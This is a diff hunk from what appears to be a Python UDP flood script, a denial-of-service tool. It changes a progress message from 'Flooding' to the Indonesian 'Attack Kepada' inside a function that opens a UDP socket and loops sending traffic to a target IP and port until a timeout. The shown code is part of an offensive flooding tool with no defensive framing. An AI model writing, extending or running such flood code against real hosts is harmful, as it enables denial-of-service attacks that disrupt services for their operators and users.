@@ -18,7 +18,7 @@ timeout = time.time() + 1 * times
 def udp(ip, port, packet, times):
   timeout = time.time() + 1 * times
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-  print(f"Flooding > {ip}:{port} time {times}")
+  print(f"Attack Kepada > {ip}:{port} Waktu {times}")
   while time.time() < timeout:
     try:
       try:
